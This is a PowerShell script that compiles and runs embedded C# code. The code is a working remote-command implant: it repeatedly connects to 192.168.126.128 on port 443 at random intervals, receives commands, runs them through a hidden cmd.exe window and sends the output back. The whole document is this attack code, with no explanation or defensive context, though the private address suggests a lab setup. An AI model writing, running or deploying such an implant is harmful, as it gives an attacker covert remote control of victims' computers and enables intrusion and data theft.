$code = @"
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace cc
{
    public class Program
    {
        public static void Main()
        {
            while(true)
            {
                var seconds = GetRandomSeconds();
                Connect("192.168.126.128");
                Thread.Sleep(seconds);
            }
            
        }

        public static string Exec(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c " + cmd;
            startInfo.UseShellExecute = false;
            process.StartInfo = startInfo;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }

        public static void Connect(string server)
        {
            Int32 port = 443;
            TcpClient tcpClient = new TcpClient(server, port);

            NetworkStream stream = tcpClient.GetStream();

            var data = new Byte[256];

            String cmd = String.Empty;

            Int32 bytes = stream.Read(data, 0, data.Length);
            cmd = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
            Console.WriteLine(cmd);

            var cmdOutput = Exec(cmd);

            byte[] msg = System.Text.Encoding.ASCII.GetBytes(cmdOutput);

            stream.Write(msg, 0, msg.Length);

            stream.Close();
            tcpClient.Close();
        }

        public static int GetRandomSeconds()
        {
            Random rand = new Random();
            return rand.Next(10000);
        }
    }

}
"@

add-type $code
iex "[cc.Program]::Main()"
